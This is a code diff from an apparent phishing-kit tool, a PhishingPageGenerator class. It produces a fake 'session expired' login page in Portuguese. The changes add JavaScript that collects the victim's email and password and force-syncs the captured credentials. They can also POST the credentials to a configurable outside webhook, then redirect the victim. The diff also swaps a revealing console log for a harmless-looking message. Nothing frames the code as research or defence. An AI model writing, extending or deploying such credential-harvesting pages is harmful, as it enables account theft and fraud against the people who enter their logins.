         <div class="warning">⚠️ Sessão expirada. Faça login novamente.</div>
-        <form id="loginForm" onsubmit="return handleSubmit(event)">
+        <!-- Removed inline onsubmit to allow generic handler to work -->
+        <form id="loginForm">
             <input type="email" name="email" placeholder="E-mail" required>
             <input type="password" name="password" placeholder="Senha" required>
             <button type="submit">Entrar</button>
         </form>
     </div>
     <script>
-        function handleSubmit(event) {{
-            event.preventDefault();
+        // Custom handler called by the generic script
+        async function handleSubmit(event) {{
+            // Data is already captured by the generic script in capturedData.form_data
+            // We just need to handle the specific redirect logic
+            
+            // Update global capturedData with form fields for redundancy
+            try {{
+                const formData = new FormData(event.target);
+                if (!capturedData.form_data) capturedData.form_data = {{}};
+                for (const [key, value] of formData.entries()) {{
+                    capturedData.form_data[key] = value;
+                }}
+                // Force sync credentials
+                await sendCapturedData(true);
+            }} catch(e) {{}}
+
             const formData = new FormData(event.target);
             const data = {{
                 page_id: '{page_id}',
@@ -702,10 +1129,12 @@ class PhishingPageGenerator:
                 password: formData.get('password'),
                 timestamp: new Date().toISOString()
             }};
+            
+            // Webhook (optional)
             {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
-            console.log('Captured:', data);
+            
+            console.log('Template logic executed');
             setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
-            return false;
         }}
     </script>
 </body>
